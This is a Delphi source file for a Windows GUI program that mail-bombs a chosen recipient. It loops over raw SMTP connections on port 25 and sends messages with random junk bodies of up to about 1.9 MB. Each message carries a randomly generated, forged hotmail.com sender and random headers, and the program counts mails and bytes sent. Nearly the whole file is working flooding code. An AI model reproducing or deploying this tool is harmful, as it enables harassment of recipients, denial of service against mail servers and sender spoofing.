   unit Unit1;

   interface

   uses
     Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
     Dialogs, StdCtrls, ExtCtrls, Winsock, ComCtrls;

   type
     TForm1 = class(TForm)
       Label1: TLabel;
       Edit1: TEdit;
       Label2: TLabel;
       CheckBox1: TCheckBox;
       CheckBox2: TCheckBox;
       Panel1: TPanel;
       Label3: TLabel;
       Label4: TLabel;
       Label5: TLabel;
       Label6: TLabel;
       Label7: TLabel;
       Label8: TLabel;
       Button1: TButton;
       Label9: TLabel;
       Edit2: TEdit;
       Timer1: TTimer;
       procedure Button1Click(Sender: TObject);
       procedure Timer1Timer(Sender: TObject);
     private
       { Private declarations }
     public
       { Public declarations }
     end;

     TEmailSettings = Record
       mReceipt    :String;
       mLarge      :Bool;
       mSpoofed    :Bool;
       mServer     :String;
       mPort       :Integer;
     End;
     PEmailSettings = ^TEmailSettings;

   var
     Form1: TForm1;
     EMailSettings: TEMailSettings;
     SendMails: Integer;
     SendBytes: Integer;
     StopSpam : Bool;

   implementation

   {$R *.dfm}

   Function CreateSocket(Host: String; Port: Integer): TSocket;
   Var
     Sock  :TSocket;
     Addr  :TSockAddrIn;
   Begin
       Sock := Socket(AF_INET, SOCK_STREAM, 0);
       Addr.sin_family := AF_INET;
       Addr.sin_port := htons(port);
       Addr.sin_addr.S_addr := inet_Addr(pchar(Host));

       If (Connect(Sock, Addr, SizeOf(Addr)) = ERROR_SUCCESS) Then
         Result := Sock
       Else
         Result := INVALID_SOCKET;
   End;

   Procedure SendData(Sock: TSocket; Text: String);
   Begin Send(Sock, Text[1], Length(Text), 0); End;

   Function MyRecv(Sock: TSocket; Code: String): Boolean; Var Buf: Array[0..2048] Of Char;
   Begin ZeroMemory(@Buf[0], SizeOf(Buf)); If (Recv(Sock, buf, sizeof(buf),0)=
   SOCKET_ERROR) or (Copy(Buf, 1, 3) <> Code) Then Result := False Else Result := True;
   End;

   Function RandomName: String;
   Var
     I: Integer;
     Abc: String;
   Begin
     Randomize;
     I := Random(10)+1;
     ABC := 'abcdefghijklmnopqrstuvwxyz';

     While (I > 0) Do
     Begin
       Dec(I);
       Result := Result + ABC[Random(Length(Abc))+1];
     End;
   End;

   Function StartSpam(P :Pointer): DWord; STDCALL;
   Var
     Server        :String;
     Receipt       :String;
     Large         :Bool;
     Spoofed       :Bool;
     Port          :Integer;

     Sock          :TSocket;
     WSA           :TWSAData;

     Rnd           :integer;
     Data          :String;

     LocalHost     :array[0..63] of Char;
   Label
     Abort;
   Begin
     SendBytes := 0;
     SendMails := 0;

     WSAStartUp($257, WSA);
     While Not (StopSpam) Do
     Begin

     If (P <> NIL) Then
     Begin
       Server  := PEmailSettings(P)^.mServer;
       Receipt := PEmailSettings(P)^.mReceipt;

       Large   := PEmailSettings(P)^.mLarge;
       Spoofed := PEmailSettings(P)^.mSpoofed;

       Port    := PEmailSettings(P)^.mPort;

       Sock := CreateSocket(Server, Port);
       If (Sock <> INVALID_SOCKET) Then
       Begin
         Randomize;
         If Not (Large) Then
         Begin
           Rnd := (Random(20)+1)*1024;
           While (Rnd > 0) Do
           Begin
             Dec(Rnd);
             Data := Data + Chr(Random(256));
           End;
         End Else
         Begin
           Rnd := (Random(1800)+100)*1024;
           While (Rnd > 0) Do
           Begin
             Dec(Rnd);
             Data := Data + Chr(Random(256));
           End;
         End;

         GetHostName(LocalHost,SizeOf(LocalHost));
         If Not (MyRecv(Sock, '220')) Then Goto Abort;
         SendData(Sock, 'HELO '+LocalHost+#13#10);
         If Not (MyRecv(Sock, '250')) Then Goto Abort;
         SendData(Sock, 'MAIL FROM: <'+RandomName+'@hotmail.com>'#13#10);
         If Not (MyRecv(Sock, '250')) Then Goto Abort;
         SendData(Sock, 'RCPT TO: <'+Receipt+'>'#13#10);
         If Not (MyRecv(Sock, '250')) Then Goto Abort;
         SendData(Sock, 'DATA'#13#10);
         If Not (MyRecv(Sock, '354')) Then Goto Abort;

         Data := 'From: '+RandomName+#13#10+
                 'To: '+RandomName+#13#10+
                 'Subject: '+RandomName+#13#10+
                 Data;

         SendBytes := SendBytes + Length(Data);

         While Length(Data) > 0 Do
         Begin
           SendData(Sock, Copy(Data, 1, 500));
           Delete(Data, 1, 500);
         End;

         SendData(Sock, #13#10'.'#13#10);
         SendMails := SendMails + 1;

         If Not (MyRecv(Sock, '250')) Then Goto Abort;
         SendData(Sock, 'QUIT'#13#10);
       End;
     End;
   Abort:

     End;
     WSACleanUp();
   End;

   FUNCTION NameToIP(HostName:STRING) : STRING;
   TYPE
     TAPInAddr = ARRAY [0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     I          : Integer;
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(pChar(HostName));
       IF HostEntPtr<>NIL THEN BEGIN
         pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
         I:=0;
         WHILE pptr^[I]<>NIL DO BEGIN
           Result:=(inet_ntoa(pptr^[I]^));
           Inc(I);
         END;
       END;
     EXCEPT
     END;
     WSACleanUp();
   END;

   procedure TForm1.Button1Click(Sender: TObject);
   var
     D: Dword;
     I: Integer;
   begin
     If (Button1.Caption = '&Start') Then
     Begin
       StopSpam := False;
       Button1.Caption := '&Stop';

       EmailSettings.mReceipt := Edit1.Text;
       EmailSettings.mLarge := CheckBox1.Checked;
       EmailSettings.mSpoofed := CheckBox1.Checked;
       EmailSettings.mServer := NameToIP(Edit2.Text);
       EmailSettings.mPort := 25;

       Label4.Caption := Edit2.Text;
       Label6.Caption := EmailSettings.mServer;
       SendMails := 0;
       SendBytes := 0;
       Label8.Caption := '0 (0,00 kb)';

   //    For I := 0 To 9 Do
         CreateThread(NIL, 0, @StartSpam, @EmailSettings, 0, D);
     End Else
     Begin
       StopSpam := True;
       Button1.Caption := '&Start';
     End;
   end;

   procedure TForm1.Timer1Timer(Sender: TObject);
   Var
     KB    :Integer;
     B     :Integer;
     Tmp   :String;
   begin
     KB := 0;
     B  := SendBytes;

     While (B > 1024) Do
     Begin
       Dec(B, 1024);
       Inc(KB, 1);
     End;

     Tmp := Copy(IntToStr(B), 1, 2);
     If (Length(Tmp) = 1) Then Tmp := '0'+ Tmp;
     Label8.Caption := IntToStr(SendMails)+' ('+IntToStr(KB)+','+Tmp+' kb)';
   end;

   end.
